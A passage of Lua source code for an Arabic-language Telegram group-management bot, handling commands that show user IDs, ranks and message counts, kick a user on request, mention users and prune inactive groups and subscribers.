local username = ('[@'..data.username_..']' or 'لا يوجد')
local iduser = result.sender_user_id_
send(msg.chat_id_, msg.id_,'🎟️┇ ايديه »(`'..iduser..'`)\n🎭┇ معرفه »('..username..')\n📌┇ رتبته »('..rtp..')\n✏┇ تعديلاته »('..edit..')\n🗳️┇ المجوهراتي »('..NUMPGAME..')\n🔖┇ جهاته »('..Contact..')\n📨┇ رسائله »('..Msguser..')')
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
end
if text and text:match("^ايدي @(.*)$") then
local username = text:match("^ايدي @(.*)$")
function start_function(extra, result, success)
if result.id_ then
tdcli_function ({ID = "GetUser",user_id_ = result.id_},function(extra,data) 
local Msguser = tonumber(database:get(bot_id..'Msg_User'..msg.chat_id_..':'..result.id_) or 1) 
local Contact = tonumber(database:get(bot_id..'Add:Contact'..msg.chat_id_..':'..result.id_) or 0) 
local NUMPGAME = tonumber(database:get(bot_id..'NUM:GAMES'..msg.chat_id_..result.id_) or 0)
local edit = tonumber(database:get(bot_id..'edits'..msg.chat_id_..result.id_) or 0)
local rtp = Rutba(result.id_,msg.chat_id_)
local username = ('[@'..data.username_..']' or 'لا يوجد')
local iduser = result.id_
send(msg.chat_id_, msg.id_,'🎟️┇ ايديه »(`'..iduser..'`)\n🎭┇ معرفه »('..username..')\n📌┇ رتبته »('..rtp..')\n✏┇ تعديلاته »('..edit..')\n🗳️┇ المجوهراتي »('..NUMPGAME..')\n🔖┇ جهاته »('..Contact..')\n📨┇ رسائله »('..Msguser..')')
end,nil)
else
send(msg.chat_id_, msg.id_,'⚠┇ المعرف غير صحيح ')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
end
if text == 'رتبتي' then
local rtp = Rutba(msg.sender_user_id_,msg.chat_id_)
send(msg.chat_id_, msg.id_,'܁༯┆رتبتك في البوت ◃ '..rtp)
end
if text == "اسمي"  then 
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(extra,result,success)
if result.first_name_  then
first_name = ' ܁༯┆اسمك اللطيف ◃ `'..(result.first_name_)..'` ↝ ܰ'
else
first_name = ''
end   
if result.last_name_ then 
last_name = ' ܁༯┆اسمك اللطيف ◃ `'..result.last_name_..'` ↝ ܰ' 
else
last_name = ''
end      
send(msg.chat_id_, msg.id_,first_name..'\n'..last_name) 
end,nil)
end 
if text == 'ايديي' then
send(msg.chat_id_, msg.id_,'܁༯┆الايدي تبعك ◃ '..msg.sender_user_id_)
end
if text == 'الرتبه' and tonumber(msg.reply_to_message_id_) > 0 then
function start_function(extra, result, success)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
local username = ('@'..data.username_..'' or 'لا يوجد')
local iduser = result.sender_user_id_
send(msg.chat_id_, msg.id_,'܁༯┆هلو عمري ↝ ܰ\n܁༯┆ايدي العضو  ◃ *'..iduser..'* ↝ ܰ\n܁༯┆معرف  العضو ◃ ˼ *'..username..'* ˹\n܁༯┆رتبة العضو ◃ *'..rtp..'* ↝ ܰ\n')
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
end
---------
if text and text:match("^الرتبه @(.*)$") then
local username = text:match("^الرتبه @(.*)$")
function start_function(extra, result, success)
if result.id_ then
tdcli_function ({ID = "GetUser",user_id_ = result.id_},function(extra,data) 
local rtp = Rutba(result.id_,msg.chat_id_)
local username = ('[@'..data.username_..']' or 'لا يوجد')
local iduser = result.id_
send(msg.chat_id_, msg.id_,'܁༯┆هلو عمري ↝ ܰ\n܁༯┆ايدي العضو  ◃ *'..iduser..'* ?? ܰ\n܁༯┆معرف  العضو ◃ *'..username..'* ↝ ܰ\n܁༯┆رتبة العضو ◃ *'..rtp..'* ↝ ܰ\n')
end,nil)
else
send(msg.chat_id_, msg.id_,'܁༯┆المعرف غلط ↝ ܰ ')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
end
---------
if text == 'كشف' and tonumber(msg.reply_to_message_id_) > 0 then
function start_function(extra, result, success)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
local username = ('[@'..data.username_..']' or 'لا يوجد')
local iduser = result.sender_user_id_
send(msg.chat_id_, msg.id_,'🎟️┇ الايدي » ('..iduser..')\n📌┇ المعرف » ('..username..')\n👮‍♂️┇ الرتبه » ('..rtp..')\n👁️‍🗨️┇ نوع الكشف » بالرد')
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
end
---------
if text and text:match("^كشف @(.*)$") then
local username = text:match("^كشف @(.*)$")
function start_function(extra, result, success)
if result.id_ then
tdcli_function ({ID = "GetUser",user_id_ = result.id_},function(extra,data) 
local rtp = Rutba(result.id_,msg.chat_id_)
local username = ('[@'..data.username_..']' or 'لا يوجد')
local iduser = result.id_
send(msg.chat_id_, msg.id_,'🎟┇ الايدي » ('..iduser..')\n📌┇ المعرف » ('..username..')\n👮‍♂️┇ الرتبه » ('..rtp..')\n👁️‍🗨️┇ نوع الكشف » بالمعرف')
end,nil)
else
send(msg.chat_id_, msg.id_,'✖┇ المعرف غير صحيح ')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
end
if text==('عدد الكروب') and Mod(msg) then  
if msg.can_be_deleted_ == false then 
send(msg.chat_id_,msg.id_,"⚠┇ البوت ليس ادمن هنا \n") 
return false  
end 
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,ta) 
tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub('-100','')},function(arg,data) 
local taha = '܁༯┆عدد الادمنية 𖢟 ◃  '..data.administrator_count_..
'\n\n܁༯┆عدد المطرودين 𖢟 ◃  '..data.kicked_count_..
'\n\n܁༯┆عدد الاعضاء 𖢟 ◃  '..data.member_count_..
'\n\n܁༯┆عدد رسائل الكروب 𖢟 ◃ '..(msg.id_/2097152/0.5)..
'\n\n܁༯┆اسم المجموعه 𖢟 ◃ ['..ta.title_..']'
send(msg.chat_id_, msg.id_, taha) 
end,nil)
end,nil)
end 
if text == 'اطردني' or text == 'طردني' then
if not database:get(bot_id..'Cick:Me'..msg.chat_id_) then
if Can_or_NotCan(msg.sender_user_id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n܁༯┆عذراً لا استطيع طرد ◃ ( '..Rutba(msg.sender_user_id_,msg.chat_id_)..' )') 
return false
end
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=msg.sender_user_id_,status_={ID="ChatMemberStatusKicked"},},function(arg,data) 
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,'܁༯┆ليس لدي صلاحية الحظر يرجى تفعيلها ↝ ܰ') 
return false  
end
if (data and data.code_ and data.code_ == 3) then 
send(msg.chat_id_, msg.id_,'⚠┇ البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
if data and data.code_ and data.code_ == 400 and data.message_ == "USER_ADMIN_INVALID" then 
send(msg.chat_id_, msg.id_,'⚠┇ عذرا لا استطيع طرد ادمنية المجموعه') 
return false  
end
if data and data.ID and data.ID == 'Ok' then
send(msg.chat_id_, msg.id_,'܁༯┆تم طردك من المجموعة ↝ ܰ ') 
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = msg.sender_user_id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
return false
end
end,nil)   
else
send(msg.chat_id_, msg.id_,'܁༯┆امر اطردني تم تعطيله من قبل المدراء ↝ ܰ') 
end
end
if text and text:match("^صيح (.*)$") then
local username = text:match("^صيح (.*)$") 
if not database:get(bot_id..'Seh:User'..msg.chat_id_) then
function start_function(extra, result, success)
if result and result.message_ and result.message_ == "USERNAME_NOT_OCCUPIED" then 
send(msg.chat_id_, msg.id_,'܁༯┆المعرف غلط ↝ ܰ ') 
return false  
end
if result and result.type_ and result.type_.channel_ and result.type_.channel_.ID == "Channel" then
send(msg.chat_id_, msg.id_,'܁༯┆لا استطيع صيح القنوات ↝ ܰ ') 
return false  
end
if result.type_.user_.type_.ID == "UserTypeBot" then
send(msg.chat_id_, msg.id_,'܁༯┆لا استطيع صيح البوتات ↝ ܰ ') 
return false  
end
if result and result.type_ and result.type_.channel_ and result.type_.channel_.is_supergroup_ == true then
send(msg.chat_id_, msg.id_,'܁༯┆لا استطيع صيح الكروبات ↝ ܰ ') 
return false  
end
if result.id_ then
send(msg.chat_id_, msg.id_,'܁༯┆تعع عمري يردوك\n◞[@'..username..']◜ ↝ ܰ') 
return false
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
else
send(msg.chat_id_, msg.id_,'܁༯┆امر صيح تم تعطيله من قبل المدراء ↝ ܰ  ') 
end
return false
end

if text == 'منو ضافني' then
if not database:get(bot_id..'Added:Me'..msg.chat_id_) then
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da) 
if da and da.status_.ID == "ChatMemberStatusCreator" then
send(msg.chat_id_, msg.id_,'܁༯┆انت منشئ المجموعةه ↝ ܰ  ') 
return false
end
local Added_Me = database:get(bot_id.."Who:Added:Me"..msg.chat_id_..':'..msg.sender_user_id_)
if Added_Me then 
tdcli_function ({ID = "GetUser",user_id_ = Added_Me},function(extra,result,success)
local Name = '['..result.first_name_..'](tg://user?id='..result.id_..')'
Text = '܁༯┆الذي قام باضافتك ◃ '..Name
sendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
end,nil)
else
send(msg.chat_id_, msg.id_,'܁༯┆ انت دخلت عبر الرابط لتلح ↝ ܰ ') 
end
end,nil)
else
send(msg.chat_id_, msg.id_,'܁༯┆امر منو ضافني تم تعطيله من قبل المدراء ↝ ܰ  ') 
end
end

if text == 'تفعيل ضافني' and Manager(msg) then   
if database:get(bot_id..'Added:Me'..msg.chat_id_) then
Text = '܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم تفعيل امر منو ضافني ↝ ܰ'
database:del(bot_id..'Added:Me'..msg.chat_id_)  
else
Text = '܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم تفعيل امر منو ضافني ↝ ܰ'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل ضافني' and Manager(msg) then  
if not database:get(bot_id..'Added:Me'..msg.chat_id_) then
database:set(bot_id..'Added:Me'..msg.chat_id_,true)  
Text = '\n܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم تعطيل امر منو ضافني ↝ ܰ'
else
Text = '\n܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم تعطيل امر منو ضافني ↝ ܰ'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل صيح' and Manager(msg) then   
if database:get(bot_id..'Seh:User'..msg.chat_id_) then
Text = '܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم تفعيل امر صيح ↝ ܰ'
database:del(bot_id..'Seh:User'..msg.chat_id_)  
else
Text = '܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم تفعيل امر صيح ↝ ܰ'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تنزيل جميع الرتب' or text == 'تنزيل الرتبه' and BasicConstructor(msg) then
database:del(bot_id..'Constructor'..msg.chat_id_)
database:del(bot_id..'Manager'..msg.chat_id_)
database:del(bot_id..'Mod:User'..msg.chat_id_)
database:del(bot_id..'Special:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '\n܁༯┆هلو عمري ↝ ܰ\n܁༯┆تم تنزيل العضو من ▾\n܁༯┆◝ المنشئين ٬ المدراء ٬ الادمنيه ٬ المميزين◟\n')
end
if text == 'تعطيل صيح' and Manager(msg) then  
if not database:get(bot_id..'Seh:User'..msg.chat_id_) then
database:set(bot_id..'Seh:User'..msg.chat_id_,true)  
Text = '\n܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم تعطيل امر صيح ↝ ܰ'
else
Text = '\n܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم تعطيل امر صيح ↝ ܰ'
end
send(msg.chat_id_, msg.id_,Text) 
end

if text == 'تفعيل اطردني' and Manager(msg) then   
if database:get(bot_id..'Cick:Me'..msg.chat_id_) then
Text = '܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم تفعيل امر اطردني ↝ ܰ'
database:del(bot_id..'Cick:Me'..msg.chat_id_)  
else
Text = '܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم تفعيل امر اطردني ↝ ܰ'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل اطردني' and Manager(msg) then  
if not database:get(bot_id..'Cick:Me'..msg.chat_id_) then
database:set(bot_id..'Cick:Me'..msg.chat_id_,true)  
Text = '\n܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم تعطيل امر اطردني ↝ ܰ'
else
Text = '\n܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم تعطيل امر اطردني ↝ ܰ'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == "صورتي"  then
local my_ph = database:get(bot_id.."my_photo:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_," ⌔┆الصوره معطله") 
return false  
end
local function getpro(extra, result, success)
if result.photos_[0] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_," ⌔┆عدد صورك ~⪼ "..result.total_count_.." صوره‌‏", msg.id_, msg.id_, "md")
else
send(msg.chat_id_, msg.id_,'لا تمتلك صوره في حسابك', 1, 'md')
  end end
tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = msg.sender_user_id_, offset_ = 0, limit_ = 1 }, getpro, nil)
end
if text == 'كلايش ايدي' and Mod(msg) then 
send(msg.chat_id_, msg.id_,'1-`.𖣂 𝙪𝙨𝙚𝙧𝙣𝙖𝙢𝙚 , #username \n.𖣂 𝙨𝙩𝙖𝙨𝙩 , #stast \n.𖣂 𝙡𝘿 , #id \n.𖣂 𝙂𝙖𝙢𝙨 , #game \n. 𖣂 𝙢𝙨𝙂𝙨 , #msgs`\n2- `- 𓏬 𝐔𝐬𝐄𝐫 : #username 𓂅 .\n- 𓏬 𝐌𝐬𝐆  : #msgs 𓂅 .\n- ?? 𝐒??𝐀 : #stast 𓂅 .\n- 𓏬 𝐈𝐃 : #id 𓂅 .`\n3- `☆•𝐮𝐬𝐞𝐫 : #username 𖣬  \n☆•𝐦𝐬𝐠  : #msgs 𖣬 \n☆•𝐬𝐭𝐚 : #stast 𖣬 \n☆•𝐢𝐝  : #id 𖣬`')
end
if text == ("ايدي") and msg.reply_to_message_id_ == 0 and not database:get(bot_id..'Bot:Id'..msg.chat_id_) then      
if not database:sismember(bot_id..'Spam:Texting'..msg.sender_user_id_,text) then
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da)  tdcli_function ({ ID = "SendChatAction",  chat_id_ = msg.sender_user_id_, action_ = {  ID = "SendMessageTypingAction", progress_ = 100}  },function(arg,ta)  tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)  tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = msg.sender_user_id_,offset_ = 0,limit_ = 1},function(extra,taha,success) 
if da.status_.ID == "ChatMemberStatusCreator" then 
rtpa = 'المالك'
elseif da.status_.ID == "ChatMemberStatusEditor" then 
rtpa = 'مشرف' 
elseif da.status_.ID == "ChatMemberStatusMember" then 
rtpa = 'عضو'
end
local Msguser = tonumber(database:get(bot_id..'Msg_User'..msg.chat_id_..':'..msg.sender_user_id_) or 1) 
local nummsggp = tonumber(msg.id_/2097152/0.5)
local nspatfa = tonumber(Msguser / nummsggp * 100)
local Contact = tonumber(database:get(bot_id..'Add:Contact'..msg.chat_id_..':'..msg.sender_user_id_) or 0) 
local NUMPGAME = tonumber(database:get(bot_id..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_) or 0)
local rtp = Rutba(msg.sender_user_id_,msg.chat_id_)
if result.username_ then
username = '@'..result.username_ 
else
username = 'لا يوجد '
end
local iduser = msg.sender_user_id_
local edit = tonumber(database:get(bot_id..'edits'..msg.chat_id_..msg.sender_user_id_) or 0)
local photps = (taha.total_count_ or 0)
local interaction = Total_Msg(Msguser)
local rtpg = rtpa
local tahaa = {
"كشخه برب 😉💘",
"ئمنور يلكمر 🌛",
"الوك الزينه👩‍🚒",
"آف تخليني ♥️",
"شهل الگيمر 🌜💘",
"اتخبل برب 😉💘",
}
local rdphoto = tahaa[math.random(#tahaa)]
if not database:get(bot_id..'Bot:Id:Photo'..msg.chat_id_) then      
local get_id_text = database:get(bot_id.."KLISH:ID"..msg.chat_id_)
if get_id_text then
if result.username_ then
username = '@'..result.username_ 
else
username = 'لا يوجد '
end
get_id_text = get_id_text:gsub('#rdphoto',rdphoto) 
get_id_text = get_id_text:gsub('#id',iduser) 
get_id_text = get_id_text:gsub('#username',username) 
get_id_text = get_id_text:gsub('#msgs',Msguser) 
get_id_text = get_id_text:gsub('#edit',edit) 
get_id_text = get_id_text:gsub('#stast',rtp) 
get_id_text = get_id_text:gsub('#auto',interaction) 
get_id_text = get_id_text:gsub('#game',NUMPGAME) 
get_id_text = get_id_text:gsub('#photos',photps) 
if result.status_.ID == "UserStatusRecently" and result.profile_photo_ ~= false then   
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, taha.photos_[0].sizes_[1].photo_.persistent_id_,get_id_text)       
else 
if result.status_.ID == "UserStatusEmpty" and result.profile_photo_ == false then
send(msg.chat_id_, msg.id_,'['..get_id_text..']')   
else
send(msg.chat_id_, msg.id_, '\n ليس لديك صور في حسابك \n['..get_id_text..']')      
end 
end
else
if result.username_ then
username = '@'..result.username_ 
else
username = 'لا يوجد '
end
if result.status_.ID == "UserStatusRecently" and result.profile_photo_ ~= false then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, taha.photos_[0].sizes_[1].photo_.persistent_id_,'\n˹ 𖢊 𝑈𝑠𝑒𝑅 𖡻 '..username..' ま .\n˹ 𖢊 𝑖𝐷 𖡻 '..msg.sender_user_id_..' ま .\n˹ 𖢊 𝑆𝑡𝑎𝑆 𖡻 '..Rutba(msg.sender_user_id_,msg.chat_id_)..' ま .\n˹ 𖢊 𝐴𝑢𝑡𝑂 𖡻 '..Total_Msg(Msguser)..' ま .\n˹ 𖢊 𝑀𝑎𝑠𝐺 𖡻 '..Msguser..' ま .\n˹ 𖢊 𝐸𝑑𝑖𝑇 𖡻 '..edit..' ま .\n˹ 𖢊 𝐺𝑎𝑚𝐸 𖡻 '..NUMPGAME..' ま .\n')   
else 
if result.status_.ID == "UserStatusEmpty" and result.profile_photo_ == false then
send(msg.chat_id_, msg.id_,'[\n˹ 𖢊 𝑈𝑠𝑒𝑅 𖡻 '..username..' ま .\n˹ 𖢊 𝑖𝐷 𖡻 '..msg.sender_user_id_..' ま .\n˹ 𖢊 𝑆𝑡𝑎𝑆 𖡻 '..Rutba(msg.sender_user_id_,msg.chat_id_)..' ま .\n˹ 𖢊 𝐴𝑢𝑡𝑂 𖡻 '..Total_Msg(Msguser)..' ま .\n˹ 𖢊 𝑀𝑎𝑠𝐺 𖡻 '..Msguser..' ま .\n˹ 𖢊 𝐸𝑑𝑖𝑇 𖡻 '..edit..' ま .\n˹ 𖢊 𝐺𝑎𝑚𝐸 𖡻 '..NUMPGAME..' ま .]\n')   
else
send(msg.chat_id_, msg.id_, '\n˹ 𖢊 𝑈𝑠𝑒𝑅 𖡻 '..username..' ま .\n˹ 𖢊 𝑖𝐷 𖡻 '..msg.sender_user_id_..' ま .\n˹ 𖢊 𝑆𝑡𝑎𝑆 𖡻 '..Rutba(msg.sender_user_id_,msg.chat_id_)..' ま .\n˹ 𖢊 𝐴𝑢𝑡𝑂 𖡻 '..Total_Msg(Msguser)..' ま .\n˹ 𖢊 𝑀𝑎𝑠𝐺 𖡻 '..Msguser..' ま .\n˹ 𖢊 𝐸𝑑𝑖𝑇 𖡻 '..edit..' ま .\n˹ 𖢊 𝐺𝑎𝑚𝐸 𖡻 '..NUMPGAME..' ま .]\n')   
end 
end
end
else
local get_id_text = database:get(bot_id.."KLISH:ID"..msg.chat_id_)
if get_id_text then
get_id_text = get_id_text:gsub('#rdphoto',rdphoto) 
get_id_text = get_id_text:gsub('#id',iduser) 
get_id_text = get_id_text:gsub('#username',username) 
get_id_text = get_id_text:gsub('#msgs',Msguser) 
get_id_text = get_id_text:gsub('#edit',edit) 
get_id_text = get_id_text:gsub('#stast',rtp) 
get_id_text = get_id_text:gsub('#auto',interaction) 
get_id_text = get_id_text:gsub('#game',NUMPGAME) 
get_id_text = get_id_text:gsub('#photos',photps) 
send(msg.chat_id_, msg.id_,'['..get_id_text..']')   
else
send(msg.chat_id_, msg.id_,'[\n˹ 𖢊 𝑈𝑠𝑒𝑅 𖡻 '..username..' ま .\n˹ 𖢊 𝑖𝐷 𖡻 '..msg.sender_user_id_..' ま .\n˹ 𖢊 𝑆𝑡𝑎𝑆 𖡻 '..Rutba(msg.sender_user_id_,msg.chat_id_)..' ま .\n˹ 𖢊 𝐴𝑢𝑡𝑂 𖡻 '..Total_Msg(Msguser)..' ま .\n˹ 𖢊 𝑀𝑎𝑠𝐺 𖡻 '..Msguser..' ま .\n˹ 𖢊 𝐸𝑑𝑖𝑇 𖡻 '..edit..' ま .\n˹ 𖢊 𝐺𝑎𝑚𝐸 𖡻 '..NUMPGAME..' ま .]\n')   
end
end

end,nil)
end,nil)
end,nil)
end,nil)
end
end

if text == 'سحكاتي' or text == 'تعديلاتي' then 
local Num = tonumber(database:get(bot_id..'edits'..msg.chat_id_..msg.sender_user_id_) or 0)
if Num == 0 then 
Text = '٭ 𖢔┆ليس لديك أي سحكات ▵ ◜'
else
Text = '٭ 𖢔┆عدد سحكاتك ◃ ◞ *'..Num..'* ◜'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == "مسح سحكاتي" or text == "حذف سحكاتي" then  
send(msg.chat_id_, msg.id_,'٭ 𖢔┆تم حذف جميع سحكاتك ▵ ◜'  )  
database:del(bot_id..'edits'..msg.chat_id_..msg.sender_user_id_)
end
if text == "مسح جهاتي" or text == "حذف جهاتي" then  
send(msg.chat_id_, msg.id_,'٭ 𖢔┆تم حذف جميع جهاتك ▵ ◜'  )  
database:del(bot_id..'Add:Contact'..msg.chat_id_..':'..msg.sender_user_id_)
end
if text == 'جهاتي' or text == 'شكد ضفت' then 
local Num = tonumber(database:get(bot_id..'Add:Contact'..msg.chat_id_..':'..msg.sender_user_id_) or 0) 
if Num == 0 then 
Text = '܁༯┆ماعدكك جهات 😹😔↝'
else
Text = '܁༯┆عدد جهاتك المضافة ˼ ['..Num..'](t.me/R_IQ9) ˹'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == "تنظيف المشتركين" and SudoBot(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
local pv = database:smembers(bot_id.."User_Bot")
local sendok = 0
for i = 1, #pv do
tdcli_function({ID='GetChat',chat_id_ = pv[i]
},function(arg,dataq)
tdcli_function ({ ID = "SendChatAction",  
chat_id_ = pv[i], action_ = {  ID = "SendMessageTypingAction", progress_ = 100} 
},function(arg,data) 
if data.ID and data.ID == "Ok"  then
else
database:srem(bot_id.."User_Bot",pv[i])
sendok = sendok + 1
end
if #pv == i then 
if sendok == 0 then
send(msg.chat_id_, msg.id_,'܁༯┆لا يوجد مشتركين وهميين في البوت ↝ ܰ  \n')   
else
local ok = #pv - sendok
send(msg.chat_id_, msg.id_,'܁༯┆ عدد المشتركين ◃ ['..#pv..'](t.me/R_IQ9) ܰ\n܁༯┆تم ازالة ◃ ['..sendok..'](t.me/R_IQ9) " من المشتركين  \n܁༯┆عدد المشتركين الحقيقي ◃ ['..ok..'](t.me/R_IQ9) " مشترك\n')   
end
end
end,nil)
end,nil)
end
return false
end
if text == "تنظيف الكروبات" and SudoBot(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
local group = database:smembers(bot_id..'Chek:Groups') 
local w = 0
local q = 0
for i = 1, #group do
tdcli_function({ID='GetChat',chat_id_ = group[i]
},function(arg,data)
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
database:srem(bot_id..'Chek:Groups',group[i])  
tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_=group[i],user_id_=bot_id,status_={ID = "ChatMemberStatusLeft"},},function(e,g) end, nil) 
w = w + 1
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
database:srem(bot_id..'Chek:Groups',group[i])  
q = q + 1
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusKicked" then
database:srem(bot_id..'Chek:Groups',group[i])  
q = q + 1
end
if data and data.code_ and data.code_ == 400 then
database:srem(bot_id..'Chek:Groups',group[i])  
w = w + 1
end
if #group == i then 
if (w + q) == 0 then
send(msg.chat_id_, msg.id_,'܁༯┆الا يوجد مشتركين وهميين في البوت ↝ ܰ \n')   
else
local MILAN = (w + q)
local sendok = #group - MILAN
if q == 0 then
MILAN = ''
else
MILAN = '\n🔰┇ تم ازالة » { '..q..' } مجموعات من البوت'
end
if w == 0 then
MILANk = ''
else
MILANk = '\n⚠️┇ تم ازالة » {'..w..'} مجموعه لان البوت عضو'
end
send(msg.chat_id_, msg.id_,'📌┇ عدد المجموعات الان » { '..#group..' }'..MILANk..''..MILAN..'\n*☑️┇ الان عدد المجموعات الحقيقي » { '..sendok..' } مجموعات\n')   
end
end
end,nil)
end
return false
end


-----------
if text ==("مسح") and Mod(msg) and tonumber(msg.reply_to_message_id_) > 0 then
DeleteMessage(msg.chat_id_,{[0] = tonumber(msg.reply_to_message_id_),msg.id_})   
end   
if database:get(bot_id.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
database:del(bot_id..'id:user'..msg.chat_id_)  
send(msg.chat_id_, msg.id_, "܁༯┆تم الالغاء ↝ ܰ ") 
database:del(bot_id.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  
end 
database:del(bot_id.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
local iduserr = database:get(bot_id..'id:user'..msg.chat_id_)  
database:del(bot_id..'Msg_User'..msg.chat_id_..':'..msg.sender_user_id_) 
database:incrby(bot_id..'Msg_User'..msg.chat_id_..':'..iduserr,numadded)  
send(msg.chat_id_, msg.id_,"\n٭ 𖤓┆تم اضافة ◞ ["..numadded..'](t.me/R_IQ9) ◜ من الرسائل ↝ ٭')  
end
------------------------------------------------------------------------
if database:get(bot_id.."gemadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
database:del(bot_id..'idgem:user'..msg.chat_id_)  
send(msg.chat_id_, msg.id_, "༯┆تم الالغاء ↝ ܰ  ") 
database:del(bot_id.."gemadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  
end 
database:del(bot_id.."gemadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
local iduserr = database:get(bot_id..'idgem:user'..msg.chat_id_)  
database:incrby(bot_id..'NUM:GAMES'..msg.chat_id_..iduserr,numadded)  
send(msg.chat_id_, msg.id_,  1, "↝┇ تم اضافة له {"..numadded..'} من المجوهراتي', 1 , 'md')  
end
------------------------------------------------------------
if text and text:match("^اضف رسائل (%d+)$") and msg.reply_to_message_id_ == 0 and Constructor(msg) then    
taha = text:match("^اضف رسائل (%d+)$")
database:set(bot_id..'id:user'..msg.chat_id_,taha)  
database:setex(bot_id.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 120, true)  
send(msg.chat_id_, msg.id_, '┐ هلو عمري ↝ ٭ \n┘ ارسل الي عدد الرسائل ٭') 
return false
end
------------------------------------------------------------------------
if text and text:match("^اضف مجوهراتي (%d+)$") and msg.reply_to_message_id_ == 0 and Constructor(msg) then  
taha = text:match("^اضف مجوهراتي (%d+)$")
database:set(bot_id..'idgem:user'..msg.chat_id_,taha)  
database:setex(bot_id.."gemadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 120, true)  
